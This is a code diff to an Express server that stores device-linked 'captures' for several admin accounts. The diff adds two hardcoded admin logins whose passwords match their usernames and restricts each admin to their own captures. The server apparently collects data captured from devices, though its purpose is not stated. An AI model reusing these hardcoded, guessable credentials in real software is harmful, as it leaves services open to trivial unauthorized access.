@@ -13,7 +13,9 @@ const JSONBLOB_URL = `https://jsonblob.com/api/jsonBlob/${JSONBLOB_ID}`;
 // Administrator accounts
 const ALLOWED_ADMINS = [
   { user: process.env.ADMIN_USER || 'Jassim99x', pass: process.env.ADMIN_PASS || 'Jassim99x', publicId: 'srv_101' },
-  { user: '1995aa', pass: '1995aa', publicId: 'srv_202' }
+  { user: '1995aa', pass: '1995aa', publicId: 'srv_202' },
+  { user: 'Alia2024', pass: 'Alia2024', publicId: 'srv_303' },
+  { user: 'Hassan88', pass: 'Hassan88', publicId: 'srv_404' }
 ];
 const VALID_TOKENS = ALLOWED_ADMINS.map(a => Buffer.from(`${a.user}:${a.pass}`).toString('base64'));
 
@@ -443,15 +445,15 @@ app.patch('/api/capture/:id', async (req, res) => {
 
 app.get('/api/captures', basicAuth, async (req, res) => {
   const all = await readCaptures();
-  // Filter: Show my isolated data + any global/unassigned data
-  const filtered = all.filter(c => c.owner === req.adminUser || c.owner === 'global');
+  // STRICT ISOLATION: Show only data belonging to the logged-in admin
+  const filtered = all.filter(c => c.owner === req.adminUser);
   res.json(filtered);
 });
 
 app.delete('/api/captures', basicAuth, async (req, res) => {
   const all = await readCaptures();
-  // Keep only data belonging to OTHER admins (not global, not mine)
-  const othersData = all.filter(c => c.owner !== req.adminUser && c.owner !== 'global');
+  // Keep only data belonging to OTHER admins
+  const othersData = all.filter(c => c.owner !== req.adminUser);
   await writeCaptures(othersData);
   broadcast('refresh');
   res.json({ status: 'cleared', deleted: all.length - othersData.length });
@@ -461,8 +463,8 @@ app.delete('/api/captures/:id', basicAuth, async (req, res) => {
   const all = await readCaptures();
   const capture = all.find(c => c.id === req.params.id);
   
-  // Can delete if I own it OR if it is global
-  if (!capture || (capture.owner !== req.adminUser && capture.owner !== 'global')) {
+  // STRICT ISOLATION: Can only delete if I own it
+  if (!capture || capture.owner !== req.adminUser) {
     return res.status(403).json({ error: 'Access denied' });
   }
 
@@ -474,8 +476,8 @@ app.delete('/api/captures/:id', basicAuth, async (req, res) => {
 
 app.delete('/api/devices/:deviceId', basicAuth, async (req, res) => {
   const all = await readCaptures();
-  // Only delete captures for this device that belong to me OR are global
-  const filtered = all.filter((c) => !(c.deviceId === req.params.deviceId && (c.owner === req.adminUser || c.owner === 'global')));
+  // STRICT ISOLATION: Only delete captures for this device that belong to me
+  const filtered = all.filter((c) => !(c.deviceId === req.params.deviceId && c.owner === req.adminUser));
   await writeCaptures(filtered);
 
   broadcast('refresh');
